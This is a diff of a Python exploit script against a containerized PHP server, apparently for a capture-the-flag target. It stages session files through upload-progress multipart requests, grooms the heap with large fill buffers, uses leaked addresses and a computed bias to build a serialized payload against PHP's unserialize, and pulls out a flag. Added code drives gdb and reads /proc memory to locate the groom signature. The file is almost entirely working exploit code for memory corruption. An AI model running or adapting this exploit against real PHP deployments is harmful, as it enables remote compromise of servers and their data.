@@ -51,19 +51,10 @@ def main():
     sh(["docker", "exec", CTNR, "sh", "-c", "rm -f /tmp/sess_*"], timeout=20)
     stage_big(sid_a)
 
-    gdb = subprocess.Popen(
-        ["gdb", "-q", "-batch", "-p", str(tgt_host),
-         "-ex", "set pagination off",
-         "-ex", "continue",
-         "-ex", "echo ===CRASH===\\n",
-         "-ex", "bt 25",
-         "-ex", "info registers pc x0 x1 x2 x30",
-         "-ex", "quit"],
-        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-
     time.sleep(1.5)  # gdb attach + continue
     s = socket.create_connection((HOST, PORT), timeout=30)
-    prod = pb([part(b"PHPSESSID", sid_a.encode()),
+    prod = pb([part(b"f", b"F" * 430080),
+               part(b"PHPSESSID", sid_a.encode()),
                part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc"),
                part(b"u", b"x" * 10, filename=b"a.txt")])
     r, dt = send(s, post_head(len(prod)), prod, timeout=60)
@@ -87,6 +78,38 @@ def main():
             log(f"dbg oracle cand off={i} data={v:#x} level={lv}")
     log(f"oracle: &BG(unserialize).data={daddr and hex(daddr)} d={dval and hex(dval)} bias={hex(bias)}")
 
+    dchunk_guess = dval
+    lw_guess = (daddr - 20) if daddr else 0
+    chunk = (dval or 0) & ~0x1FFFFF
+    sig = bias + 0xf20000
+    bp = bias + 0x3c118c  # php_var_unserialize_destroy
+    if mode == "benign":
+        script = f"""set pagination off
+break *0x{bp:x}
+continue
+echo ===BP-HIT===\n
+continue
+"""
+    else:
+        script = f"""set pagination off
+continue
+echo ===CRASH===\n
+bt 6
+info registers pc x0 x1
+echo ===SIG===\n
+find /g 0x{chunk:x}, 0x{chunk + 0x200000:x}, 0x{sig:x}
+echo ===DCHUNK===\n
+x/8gx 0x{(dchunk_guess or 0):x}
+quit
+"""
+    with open("/tmp/gdbcmd.txt", "w") as f:
+        f.write(script)
+    gdb = subprocess.Popen(
+        ["gdb", "-q", "-batch", "-p", str(tgt_host),
+         "-x", "/tmp/gdbcmd.txt"],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+
+    time.sleep(0.3)
     payload = build_payload(dval, daddr, bias)
     stage(sid_b, b"poc|i:1;" if mode == "benign" else b'poc|O:9:"Exception":0:{}')
     comb = b"F" * FILL + payload
@@ -100,15 +123,56 @@ def main():
     log(f"consumer: t={dt:.1f}s len={len(r)} FLAG={flag and flag.group()}")
     s.close()
 
+    if mode == "benign":
+        # gdb is stopped at php_var_unserialize_destroy (or waiting);
+        # scan ALL rw regions of the stopped child for the groom sig.
+        time.sleep(1)
+        hits = []
+        with open(f"/proc/{tgt_host}/maps") as f:
+            maps = f.read().splitlines()
+        with open(f"/proc/{tgt_host}/mem", "rb") as m:
+            for line in maps:
+                parts = line.split()
+                if len(parts) < 2 or "r" not in parts[1] or "w" not in parts[1]:
+                    continue
+                if len(parts) > 5 and "/" in parts[5]:
+                    continue
+                st, en = [int(x, 16) for x in parts[0].split("-")]
+                if en - st > 0x800000:
+                    continue
+                try:
+                    m.seek(st)
+                    blob = m.read(en - st)
+                except OSError:
+                    continue
+                pat = struct.pack("<Q", sig)
+                i = 0
+                while True:
+                    j = blob.find(pat, i)
+                    if j < 0:
+                        break
+                    hits.append((hex(st + j), parts[5] if len(parts) > 5 else "anon"))
+                    i = j + 1
+        for h in hits:
+            log(f"SIG-HIT: {h[0]} ({h[1]}) chunkrel={h[0]}")
+        gdb.kill()
+        out, _ = gdb.communicate()
+        for h in others:
+            os.kill(h, signal.SIGCONT)
+        log("benign scan done")
+        return
+
     try:
         out, _ = gdb.communicate(timeout=15)
     except subprocess.TimeoutExpired:
         gdb.kill()
         out, _ = gdb.communicate()
-    for line in out.splitlines():
-        if ("#" in line or "Signal" in line or "pc " in line or
-                "===CRASH===" in line or "x0 " in line):
-            print(line)
+    with open("/tmp/gdbout.txt", "w") as f:
+        f.write(out)
+    lines = out.splitlines()
+    mark = next((i for i, l in enumerate(lines) if "DCHUNK" in l), 0)
+    for line in lines[max(mark - 2, 0):]:
+        print(line)
     for h in others:
         os.kill(h, signal.SIGCONT)
     log("cleanup: SIGCONT sent")
